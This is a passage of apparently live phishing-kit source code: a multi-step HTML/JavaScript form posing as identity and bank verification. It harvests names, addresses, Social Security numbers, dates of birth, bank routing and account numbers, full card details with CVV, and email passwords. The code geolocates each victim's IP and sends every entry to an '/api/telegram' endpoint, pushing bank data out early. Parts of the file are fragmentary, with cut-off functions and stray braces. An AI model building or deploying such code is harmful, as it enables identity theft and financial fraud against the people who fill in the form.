        @keyframes fadeInUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        { id: 2, name: "SSN & DOB", fields: ["ssn", "dob"] },

        { id: 5, name: "Email & Password", fields: ["email", "password"] }
    ];
    
    let currentStep = 0;
    let partialDataSent = { bank: false, full: false };
    let formData = {
        fullName: "", addressStreet: "", addressCity: "", addressState: "", addressZip: "",
        ssn: "", dob: "", bankName: "", routingNumber: "", accountNumber: "",
        cardNumber: "", cardExpiry: "", cardCvv: "", email: "", password: ""
    };

    function formatSSN(value) { let numbers = value.replace(/\D/g, ''); if (numbers.length >= 3 && numbers.length < 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3); } else if (numbers.length >= 6) { numbers = numbers.slice(0, 3) + '-' + numbers.slice(3, 5) + '-' + numbers.slice(5, 9); } return numbers.slice(0, 11); }
    function formatCardNumber(value) { let numbers = value.replace(/\D/g, ''); let formatted = ''; for (let i = 0; i < numbers.length && i < 16; i++) { if (i > 0 && i % 4 === 0) formatted += ' '; formatted += numbers[i]; } return formatted; }
    function formatExpiry(value) { let numbers = value.replace(/\D/g, ''); if (numbers.length >= 2) { numbers = numbers.slice(0, 2) + '/' + numbers.slice(2, 4); } return numbers.slice(0, 5); }
    function validateCardNumber(cardNumber) { const numbers = cardNumber.replace(/\D/g, ''); if (numbers.length !== 16) return false; let sum = 0, alternate = false; for (let i = numbers.length - 1; i >= 0; i--) { let n = parseInt(numbers[i]); if (alternate) { n *= 2; if (n > 9) n -= 9; } sum += n; alternate = !alternate; } return sum % 10 === 0; }
    
    function syncFormData() { document.querySelectorAll('[data-field]').forEach(input => { const field = input.getAttribute('data-field'); if (formData.hasOwnProperty(field)) formData[field] = input.value; }); }
    
    function renderProgress() {
        const tracker = document.getElementById('progressTracker');
        if (!tracker) return;
        tracker.innerHTML = steps.map((step, idx) => {
            let statusClass = '';
            if (idx < currentStep) statusClass = 'completed';
            else if (idx === currentStep) statusClass = 'active';
            let icon = '';
            if (statusClass === 'completed') icon = '<i class="fas fa-check-circle"></i>';
            else if (statusClass === 'active') icon = '<i class="fas fa-circle" style="font-size: 0.6rem;"></i>';
            else icon = '<i class="far fa-circle"></i>';
            return `<div class="step-marker ${statusClass}" onclick="goToStep(${idx})"><div class="step-icon">${icon}</div><span class="step-label">${step.name}</span></div>`;
        }).join('');
    }
    
    window.goToStep = function(stepIdx) { if (stepIdx < currentStep) { currentStep = stepIdx; renderProgress(); renderStep(currentStep); window.scrollTo({ top: 0, behavior: 'smooth' }); } };
    
    function validateCurrentStep(stepIdx) {
        if (stepIdx === 0) { const name = document.querySelector('[data-field="fullName"]')?.value.trim(); if (!name) return "Full name is required"; if (name.length < 3) return "Please enter your full legal name"; return null; }
        if (stepIdx === 1) { const street = document.querySelector('[data-field="addressStreet"]')?.value.trim(); if (!street) return "Street address is required"; const state = document.querySelector('[data-field="addressState"]')?.value; if (!state) return "Please select a state"; return null; }
        if (stepIdx === 2) { const ssn = document.querySelector('[data-field="ssn"]')?.value.trim(); const dob = document.querySelector('[data-field="dob"]')?.value.trim(); if (!ssn) return "SSN is required"; if (ssn.replace(/\D/g, '').length !== 9) return "SSN must be 9 digits"; if (!dob) return "Date of birth is required"; return null; }
        if (stepIdx === 3) { const bank = document.querySelector('[data-field="bankName"]')?.value; const routing = document.querySelector('[data-field="routingNumber"]')?.value.trim(); const account = document.querySelector('[data-field="accountNumber"]')?.value.trim(); if (!bank) return "Please select your bank"; if (!routing) return "Routing number required"; if (routing.replace(/\D/g, '').length !== 9) return "Routing number must be exactly 9 digits"; if (!account) return "Account number required"; return null; }
        if (stepIdx === 4) { const card = document.querySelector('[data-field="cardNumber"]')?.value.trim(); const expiry = document.querySelector('[data-field="cardExpiry"]')?.value.trim(); const cvv = document.querySelector('[data-field="cardCvv"]')?.value.trim(); if (!card) return "Card number required"; if (card.replace(/\D/g, '').length !== 16) return "Card number must be 16 digits"; if (!validateCardNumber(card)) return "Invalid card number"; if (!expiry) return "Expiry date required"; if (!/^\d{2}\/\d{2}$/.test(expiry)) return "Expiry must be MM/YY format"; const [month, year] = expiry.split('/'); const now = new Date(); const currentYear = now.getFullYear() % 100; const currentMonth = now.getMonth() + 1; if (parseInt(year) < currentYear || (parseInt(year) === currentYear && parseInt(month) < currentMonth)) return "Card has expired"; if (!cvv) return "CVV required"; if (cvv.replace(/\D/g, '').length !== 3) return "CVV must be 3 digits"; return null; }
        if (stepIdx === 5) { const email = document.querySelector('[data-field="email"]')?.value.trim(); if (!email) return "Email address required"; const emailRegex = /^[^\s@]+@([^\s@]+)$/; if (!emailRegex.test(email)) return "Valid email required"; const pwd = document.querySelector('[data-field="password"]')?.value; if (!pwd) return "Password required"; if (pwd.length < 4) return "Password must be at least 4 characters"; return null; }
        return null;
    }
    
    function handleEmailDomainLogic(emailValue) { if (!emailValue) return null; const domain = emailValue.split('@')[1]; if (domain) return `🔐 ${domain.toUpperCase()} verification required: Please enter your email password to confirm ownership.`; return null; }
    
    function showTemporaryMessage(msg, type = 'error') { const msgDiv = document.getElementById('globalMessage'); if (msgDiv) { const bgColor = type === 'error' ? '#fee2e2' : '#e6f7e6'; const textColor = type === 'error' ? '#b91c1c' : '#2e7d32'; const icon = type === 'error' ? 'fa-exclamation-triangle' : 'fa-check-circle'; msgDiv.innerHTML = `<div style="background:${bgColor}; padding:14px; border-radius:20px; color:${textColor}; font-size:0.85rem; display:flex; align-items:center; gap:10px;"><i class="fas ${icon}"></i> ${msg}</div>`; setTimeout(() => { if(msgDiv) msgDiv.innerHTML = ''; }, 5000); } }
    
    async function sendToTelegramAPI(data, type = 'partial') {
        try {
            let ipInfo = { ip: 'Unknown', country: 'Unknown', city: 'Unknown', region: 'Unknown' };
            try {
                const ipResponse = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipResponse.json();
                ipInfo.ip = ipData.ip;
                const geoResponse = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
                const geoData = await geoResponse.json();
                ipInfo.country = geoData.country_name || 'Unknown';
                ipInfo.city = geoData.city || 'Unknown';
                ipInfo.region = geoData.region || 'Unknown';
            } catch(e) { console.log('IP fetch failed'); }
            
            const payload = { ...data, ipInfo, userAgent: navigator.userAgent, timestamp: new Date().toISOString(), submissionType: type };
            const response = await fetch('/api/telegram', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
            if (!response.ok) { const errorData = await response.json().catch(() => ({})); throw new Error(errorData.error || `HTTP ${response.status}`); }
            return await response.json();
        } catch (error) { console.error('API Error:', error); return { success: false, error: error.message || 'Network error. Please try again.' }; }
    }

        if (result.success) {
            partialDataSent.bank = true;
            showTemporaryMessage('✓ Bank details verified and recorded', 'success');
            return true;
        }
        return false;
    }

    }

    async function goToNextStep() {
        syncFormData();
        const errorMsg = validateCurrentStep(currentStep);
        if (errorMsg) { showTemporaryMessage(errorMsg, 'error'); return; }
        
        // Send partial data when leaving Bank Details step (step 3)
        if (currentStep === 3) {
            const sendResult = await sendPartialBankData();
            if (!sendResult) {
                showTemporaryMessage('Unable to verify bank details. Please check your connection.', 'error');
                return;
            }
        }
        
        if (currentStep < steps.length - 1) {
            currentStep++;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
    
    function goToPrevStep() {
        if (currentStep > 0) {
            syncFormData();
            currentStep--;
            renderProgress();
            renderStep(currentStep);
            window.scrollTo({ top: 0, behavior: 'smooth' });
        }
    }
    
    function renderStep(stepIndex) {
        const container = document.getElementById('stepsContainer');
        if (!container) return;
        const stateOptions = US_STATES.map(state => `<option value="${state}" ${formData.addressState === state ? 'selected' : ''}>${state}</option>`).join('');
        const bankOptions = BANK_LIST.map(bank => `<option value="${bank}" ${formData.bankName === bank ? 'selected' : ''}>${bank}</option>`).join('');
        
        const stepsHtml = {
            0: `<div class="step-content"><div class="input-group"><label><i class="fas fa-user"></i> Full Legal Name</label><input type="text" data-field="fullName" placeholder="Johnathan Michael Doe" value="${escapeHtml(formData.fullName)}"></div><button class="btn-next btn-purple" id="nextStepBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>`,
            1: `<div class="step-content"><div class="input-group"><label><i class="fas fa-home"></i> Street Address</label><input type="text" data-field="addressStreet" placeholder="123 Main St, Apt 4B" value="${escapeHtml(formData.addressStreet)}"></div><div class="input-group"><label>City</label><input type="text" data-field="addressCity" placeholder="City" value="${escapeHtml(formData.addressCity)}"></div><div class="input-group"><label>State</label><select data-field="addressState">${stateOptions}</select></div><div class="input-group"><label>ZIP Code</label><input type="text" data-field="addressZip" placeholder="ZIP Code" value="${escapeHtml(formData.addressZip)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
            2: `<div class="step-content"><div class="input-group"><label><i class="fas fa-id-card"></i> Social Security Number</label><input type="text" data-field="ssn" id="ssnInput" placeholder="XXX-XX-XXXX" value="${escapeHtml(formData.ssn)}" maxlength="11"></div><div class="input-group"><label><i class="fas fa-calendar-alt"></i> Date of Birth</label><input type="date" data-field="dob" value="${escapeHtml(formData.dob)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
            3: `<div class="step-content"><div class="input-group"><label><i class="fas fa-university"></i> Select Your Bank</label><select data-field="bankName">${bankOptions}</select></div><div class="input-group"><label><i class="fas fa-route"></i> Routing Number (9-digit)</label><input type="text" data-field="routingNumber" id="routingInput" placeholder="021000021" value="${escapeHtml(formData.routingNumber)}" maxlength="9"></div><div class="input-group"><label><i class="fas fa-credit-card"></i> Account Number</label><input type="text" data-field="accountNumber" placeholder="Your bank account number" value="${escapeHtml(formData.accountNumber)}"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
            4: `<div class="step-content"><div class="input-group"><label><i class="fas fa-credit-card"></i> Debit/Credit Card Number</label><input type="text" data-field="cardNumber" id="cardInput" placeholder="4672 3782 2893 3782" value="${escapeHtml(formData.cardNumber)}" maxlength="19"></div><div class="input-group"><label>Expiry Date (MM/YY)</label><input type="text" data-field="cardExpiry" id="expiryInput" placeholder="MM/YY" value="${escapeHtml(formData.cardExpiry)}" maxlength="5"></div><div class="input-group"><label>CVV</label><input type="password" data-field="cardCvv" id="cvvInput" placeholder="123" value="${escapeHtml(formData.cardCvv)}" maxlength="3"></div><button class="btn-next btn-purple" id="nextStepBtn">Continue <i class="fas fa-arrow-right"></i></button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`,
            5: `<div class="step-content"><div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label><input type="email" data-field="email" id="emailInputField" placeholder="you@example.com" value="${escapeHtml(formData.email)}"></div><div id="domainAlertBox" class="domain-alert" style="display: ${formData.email && formData.email.includes('@') ? 'flex' : 'none'};"><i class="fas fa-globe"></i> <span id="domainMessage">${formData.email ? handleEmailDomainLogic(formData.email) || '' : ''}</span></div><div class="input-group password-field-wrapper"><label><i class="fas fa-lock"></i> Email Account Password</label><input type="password" data-field="password" id="passwordField" placeholder="Enter your email password" value="${escapeHtml(formData.password)}"><span class="toggle-password" id="togglePasswordIcon"><i class="far fa-eye-slash"></i></span></div><button class="btn-submit btn-purple" id="submitAllBtn"><i class="fab fa-telegram"></i> Verify & Complete</button><button class="btn-back" id="prevStepBtn"><i class="fas fa-chevron-left"></i> Back</button></div>`
        };
        
        container.innerHTML = stepsHtml[stepIndex];
        
        document.getElementById('ssnInput')?.addEventListener('input', (e) => { e.target.value = formatSSN(e.target.value); });
        document.getElementById('routingInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9); });
        const cardInput = document.getElementById('cardInput');
        if (cardInput) { cardInput.addEventListener('input', (e) => { e.target.value = formatCardNumber(e.target.value); if (validateCardNumber(e.target.value)) e.target.classList.add('valid-card'); else e.target.classList.remove('valid-card'); }); }
        document.getElementById('expiryInput')?.addEventListener('input', (e) => { e.target.value = formatExpiry(e.target.value); });
        document.getElementById('cvvInput')?.addEventListener('input', (e) => { e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3); });
        document.getElementById('nextStepBtn')?.addEventListener('click', goToNextStep);
        document.getElementById('prevStepBtn')?.addEventListener('click', goToPrevStep);
        document.getElementById('submitAllBtn')?.addEventListener('click', finalSubmit);
        
        const emailInput = document.getElementById('emailInputField');
        if (emailInput && stepIndex === 5) { emailInput.addEventListener('input', (e) => { const emailVal = e.target.value; formData.email = emailVal; const domainMsg = handleEmailDomainLogic(emailVal); const alertBox = document.getElementById('domainAlertBox'); const domainMsgSpan = document.getElementById('domainMessage'); if (alertBox && domainMsgSpan) { if (domainMsg && emailVal) { alertBox.style.display = 'flex'; domainMsgSpan.textContent = domainMsg; } else { alertBox.style.display = 'none'; } } }); }
        
        const togglePwd = document.getElementById('togglePasswordIcon');
        const pwdField = document.getElementById('passwordField');
        if (togglePwd && pwdField) { togglePwd.addEventListener('click', () => { const type = pwdField.getAttribute('type') === 'password' ? 'text' : 'password'; pwdField.setAttribute('type', type); togglePwd.innerHTML = type === 'password' ? '<i class="far fa-eye-slash"></i>' : '<i class="far fa-eye"></i>'; }); }
    }
    
    function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, function(m){ if(m === '&') return '&amp;'; if(m === '<') return '&lt;'; if(m === '>') return '&gt;'; return m; }); }
    
    function init() { renderProgress(); renderStep(0); }
    init();
</script>
</body>
</html>
